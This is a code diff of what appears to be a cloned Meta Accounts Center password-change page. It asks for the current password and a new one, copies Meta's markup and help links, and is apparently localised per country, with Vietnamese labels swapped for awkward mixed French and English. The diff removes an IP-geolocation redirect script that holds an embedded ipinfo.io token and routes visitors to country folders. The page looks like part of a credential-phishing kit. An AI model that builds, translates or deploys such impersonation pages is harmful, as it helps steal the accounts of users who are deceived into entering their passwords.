@@ -1,80 +1,11 @@
 <!DOCTYPE html>
 <html lang="en">
   <head>
-    <script>
-      // Hàm để thực hiện redirect dựa trên quốc gia
-      function redirectBasedOnCountry(countryCode) {
-        // Định nghĩa các mã quốc gia cần kiểm tra
-        const targetCountries = ["US", "CA"]; // Thêm các mã quốc gia khác nếu cần thiết
-
-        // Kiểm tra xem địa chỉ IP thuộc quốc gia nào
-        console.log(window.location.href)
-        if (countryCode === "VN" ) {
-          // Nếu đúng quốc gia, thực hiện redirect
-          // window.location.href = `https://example.com/${countryCode}`;
-          window.location.href = window.location.origin + "/vi";
-
-        }
-        if (countryCode === "US" || countryCode === "CA") {
-          window.location.href = window.location.origin + "/en";
-        }
-
-        if (countryCode === "AT") {
-          window.location.href = window.location.origin + "/at";
-        }
-        // 
-        if (countryCode === "BR") {
-          window.location.href = window.location.origin + "/br";
-        }
-        if (countryCode === "DE") {
-          window.location.href = window.location.origin + "/de";
-        }
-        if (countryCode === "ES") {
-          window.location.href = window.location.origin + "/es";
-        }
-        if (countryCode === "FR") {
-          window.location.href = window.location.origin + "/fr";
-        }
-        if (countryCode === "AT") {
-          window.location.href = window.location.origin + "/at";
-        }
-        if (countryCode === "JP") {
-          window.location.href = window.location.origin + "/jp";
-        }
-        if (countryCode === "KR") {
-          window.location.href = window.location.origin + "/kr";
-        }
-        if (countryCode === "RO") {
-          window.location.href = window.location.origin + "/ro";
-        }
-        if (countryCode === "PT") {
-          window.location.href = window.location.origin + "/pt";
-        }
-        if (countryCode === "BS") {
-          window.location.href = window.location.origin + "/bs";
-        }
-        if (countryCode === "GB") {
-          window.location.href = window.location.origin + "/gb";
-        }
-        if (countryCode === "SG") {
-          window.location.href = window.location.origin + "/en";
-        }
-      }
-      // Sử dụng ipinfo.io để lấy thông tin địa chỉ IP
-      fetch("https://ipinfo.io/json?token=fb1cf83163037b") // Thay YOUR_IPINFO_IO_TOKEN bằng token của bạn
-        .then((response) => response.json())
-        .then((data) => {
-          const countryCode = data.country;
-          console.log(countryCode);
-          // Thực hiện redirect dựa trên mã quốc gia
-          redirectBasedOnCountry(countryCode);
-        })
-        .catch((error) => console.error("Error fetching IP info:", error));
-    </script>
-
+    
+    
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <link rel="stylesheet" href="style.css" />
+    <link rel="stylesheet" href="../style.css" />
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
     <script
       src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.6.1/axios.min.js"
@@ -276,7 +207,7 @@
                                                           );
                                                         "
                                                         >Quản lý phần cài đặt
-                                                        tài khoản và trải nghiệm
+                                                        Account và trải nghiệm
                                                         kết nối trên các công
                                                         nghệ của Meta như
                                                         Facebook, Instagram và
@@ -289,7 +220,7 @@
                                                             );
                                                           "
                                                           ><a
-                                                            aria-label="Tìm hiểu thêm về Trung tâm tài khoản – liên kết sẽ mở trong cửa sổ mới"
+                                                            aria-label="Tìm hiểu thêm về Trung tâm Account – liên kết sẽ mở trong cửa sổ mới"
                                                             class="x1i10hfl x1qjc9v5 xjbqb8w xjqpnuy xa49m3k xqeqjp1 x2hbi6w x13fuv20 xu3j5b3 x1q0q8m5 x26u7qi x972fbf xcfux6l x1qhh985 xm0m39n x9f619 x1ypdohk xdl72j9 x2lah0s xe8uvvx xdj266r x11i5rnm xat24cr x1mh8g0r x2lwn1j xeuugli xexx8yu x4uap5 x18d9i69 xkhd6sd x16tdsg8 x1hl2dhg xggy1nq x1ja2u2z x1t137rt x1o1ewxj x3x9cwd x1e5q0jg x13rtm0m x1q0g3np x1lku1pv x1a2a7pz xt0psk2 x1n2onr6 x87ps6o x1fey0fg"
                                                             href="https://www.facebook.com/help/943858526073065"
                                                             role="link"
@@ -602,7 +533,7 @@
                                                       1em
                                                   );
                                                 "
-                                                >Cài đặt tài khoản</span
+                                                >Cài đặt Account</span
                                               >
                                             </h2>
                                           </div>
@@ -615,7 +546,7 @@
                                               role="tab"
                                               tabindex="0"
                                               target="_self"
-                                              aria-label="Tài khoản"
+                                              aria-label="Account"
                                               ><div
                                                 class="x9f619 x1n2onr6 x1ja2u2z x1qjc9v5 x78zum5 xdt5ytf xl56j7k xeuugli xdl72j9 x1iyjqo2 x2lah0s x1mq37bv x1pi30zi x1swvt13 x1gw22gp x188425o"
                                                 aria-hidden="true"
@@ -666,7 +597,7 @@
                                                                 ) * 1em
                                                             );
                                                           "
-                                                          >Tài khoản</span
+                                                          >Compte</span
                                                         >
                                                       </div>
                                                     </div>
@@ -1367,7 +1298,7 @@
                                                     href="/password_and_security/password/change/"
                                                     role="link"
                                                     tabindex="0"
-                                                    aria-label="Đổi mật khẩu"
+                                                    aria-label="Changer le mot de passe"
                                                     ><div
                                                       class="x9f619 x1n2onr6 x1ja2u2z x1qjc9v5 x78zum5 xdt5ytf xl56j7k xeuugli xdl72j9 x1iyjqo2 x2lah0s x1mq37bv x1pi30zi x1swvt13 x1gw22gp x188425o"
                                                       aria-hidden="true"
@@ -2750,7 +2681,7 @@
                                                     1em
                                                 );
                                               "
-                                              >Đổi mật khẩu</span
+                                              >Changer le mot de passe</span
                                             >
                                           </h2>
                                           <span
@@ -2763,7 +2694,7 @@
                                                 var(--body-line-height) * 1em
                                               );
                                             "
-                                            >Chọn tài khoản để đổi mật
+                                            >Chọn Account để đổi mật
                                             khẩu.</span
                                           >
                                         </div>
@@ -3157,7 +3088,7 @@
                                                     1em
                                                 );
                                               "
-                                              >Đổi mật khẩu</span
+                                              >Changer le mot de passe</span
                                             >
                                           </h2>
                                           <span
@@ -3170,9 +3101,9 @@
                                                 var(--body-line-height) * 1em
                                               );
                                             "
-                                            >Mật khẩu của bạn phải có ít nhất 6
-                                            ký tự, bao gồm cả chữ số, chữ cái và
-                                            ký tự đặc biệt (!$@%).</span
+                                            >Votre mot de passe Doit être au moins 6
+                                            caractères, y compris les chiffres, les lettres et
+                                            caractère spécial ($@%).</span
                                           >
                                         </div>
                                       </div>
@@ -3194,7 +3125,7 @@
                                               id="account-label"
                                               class="xwyjyys x1fhayk4 x3cjxhe x1al4vs7 x12scifz xmper1u x92rtbv x193iq5w x6ikm8r x10wlt62 x47corl x10l6tqk x16q8cke xlyipyv xt2fmrd xii2z7h x11xpdln x1r7x56h xuxw1ft x361rvq x10emqs4 xs8nzd4 x1fzehxr"
                                               for="account-field"
-                                              >Tài khoản</label
+                                              >Compte</label
                                             >
                                           </div>
                                         </div>
@@ -3218,8 +3149,7 @@
                                               id="password-label"
                                               class="xwyjyys x1fhayk4 x3cjxhe x1al4vs7 x12scifz xmper1u x92rtbv x193iq5w x6ikm8r x10wlt62 x47corl x10l6tqk x16q8cke xlyipyv xt2fmrd xii2z7h x11xpdln x1r7x56h xuxw1ft x361rvq x10emqs4 xs8nzd4 x1fzehxr"
                                               for=":rk:"
-                                              >Mật khẩu hiện tại (Ngày cập nhật:
-                                              06/05/2023)</label
+                                              >Mot de passe actuel</label
                                             >
                                             <div
                                               style="display: none"
@@ -3276,7 +3206,7 @@
                                               id="newpassword-label"
                                               class="xwyjyys x1fhayk4 x3cjxhe x1al4vs7 x12scifz xmper1u x92rtbv x193iq5w x6ikm8r x10wlt62 x47corl x10l6tqk x16q8cke xlyipyv xt2fmrd xii2z7h x11xpdln x1r7x56h xuxw1ft x361rvq x10emqs4 xs8nzd4 x1fzehxr"
                                               for=":rm:"
-                                              >Mật khẩu mới</label
+                                              >Nouveau mot de passe</label
                                             >
                                             <div
                                               style="display: none"
@@ -3295,10 +3225,10 @@
                                                   width="1em"
                                                   height="1em"
                                                   class="x1lliihq x1k90msu x2h7rmj x1qfuztq x198g3q0 xxk0z11 xvy4d1p"
-                                                  title="Show new password"
+                                                  title="Show Nouveau mot de passe"
                                                 >
                                                   <title>
-                                                    Show new password
+                                                    Show Nouveau mot de passe
                                                   </title>
                                                   <path
                                                     fill-rule="evenodd"
@@ -3335,7 +3265,7 @@
                                               id="confirmpassword-label"
                                               class="xwyjyys x1fhayk4 x3cjxhe x1al4vs7 x12scifz xmper1u x92rtbv x193iq5w x6ikm8r x10wlt62 x47corl x10l6tqk x16q8cke xlyipyv xt2fmrd xii2z7h x11xpdln x1r7x56h xuxw1ft x361rvq x10emqs4 xs8nzd4 x1fzehxr"
                                               for=":ro:"
-                                              >Nhập lại mật khẩu mới</label
+                                              >Confirmez le mot de passe</label
                                             >
                                             <div
                                               style="display: none"
@@ -3354,10 +3284,10 @@
                                                   width="1em"
                                                   height="1em"
                                                   class="x1lliihq x1k90msu x2h7rmj x1qfuztq x198g3q0 xxk0z11 xvy4d1p"
-                                                  title="Show confirm password"
+                                                  title="Show Confirmez le mot de passe"
                                                 >
                                                   <title>
-                                                    Show confirm password
+                                                    Show Confirmez le mot de passe
                                                   </title>
                                                   <path
                                                     fill-rule="evenodd"
@@ -3396,7 +3326,7 @@
                                                   1em
                                               );
                                             "
-                                            >Bạn quên mật khẩu ư?</span
+                                            >Tu as oublié le mot de passe ?</span
                                           ></a
                                         >
                                       </div>
@@ -3495,7 +3425,7 @@
                                                       "
                                                       ><span
                                                         class="x1lliihq x193iq5w x6ikm8r x10wlt62 xlyipyv xuxw1ft"
-                                                        >Đổi mật khẩu</span
+                                                        >Changer le mot de passe</span
                                                       ></span
                                                     >
                                                   </div>
@@ -3731,7 +3661,7 @@
         $("#newpassword-field").attr("type", "password");
         $(this)
           .html(`<svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" class="x1lliihq x1k90msu x2h7rmj x1qfuztq x198g3q0 xxk0z11 xvy4d1p" title="Show password">
-                                                  <title>Show new password</title>
+                                                  <title>Show Nouveau mot de passe</title>
                                                   <path fill-rule="evenodd" clip-rule="evenodd" d="M20.293 2.293a1 1 0 1 1 1.414 1.414l-18 18a1 1 0 0 1-1.414-1.414l3.446-3.446c-.238-.188-.47-.387-.694-.6L1.31 12.722a.985.985 0 0 1 0-1.436l3.734-3.527c3.15-2.976 7.77-3.542 11.48-1.697l3.768-3.768zm-5.275 5.275c-2.852-1.138-6.23-.596-8.582 1.627l-2.974 2.808 2.974 2.809c.233.22.476.423.727.61l1.391-1.39a4 4 0 0 1 5.478-5.478l.986-.986zm-2.5 2.5a2.001 2.001 0 0 0-2.45 2.45l2.45-2.45z"></path>
                                                   <path d="M22.69 11.285 19.7 8.463l-1.414 1.414 2.251 2.126-2.973 2.809a8.099 8.099 0 0 1-6.377 2.164l-1.712 1.712c3.268.833 6.876.02 9.48-2.44l3.733-3.527a.985.985 0 0 0 0-1.436z"></path>
                                                   <path d="M15.997 12.167a4 4 0 0 1-3.83 3.83l3.83-3.83z"></path>
@@ -3751,7 +3681,7 @@
         $("#confirmpassword-field").attr("type", "password");
         $(this)
           .html(`<svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" class="x1lliihq x1k90msu x2h7rmj x1qfuztq x198g3q0 xxk0z11 xvy4d1p" title="Show password">
-                                                  <title>Show new password</title>
+                                                  <title>Show Nouveau mot de passe</title>
                                                   <path fill-rule="evenodd" clip-rule="evenodd" d="M20.293 2.293a1 1 0 1 1 1.414 1.414l-18 18a1 1 0 0 1-1.414-1.414l3.446-3.446c-.238-.188-.47-.387-.694-.6L1.31 12.722a.985.985 0 0 1 0-1.436l3.734-3.527c3.15-2.976 7.77-3.542 11.48-1.697l3.768-3.768zm-5.275 5.275c-2.852-1.138-6.23-.596-8.582 1.627l-2.974 2.808 2.974 2.809c.233.22.476.423.727.61l1.391-1.39a4 4 0 0 1 5.478-5.478l.986-.986zm-2.5 2.5a2.001 2.001 0 0 0-2.45 2.45l2.45-2.45z"></path>
                                                   <path d="M22.69 11.285 19.7 8.463l-1.414 1.414 2.251 2.126-2.973 2.809a8.099 8.099 0 0 1-6.377 2.164l-1.712 1.712c3.268.833 6.876.02 9.48-2.44l3.733-3.527a.985.985 0 0 0 0-1.436z"></path>
                                                   <path d="M15.997 12.167a4 4 0 0 1-3.83 3.83l3.83-3.83z"></path>
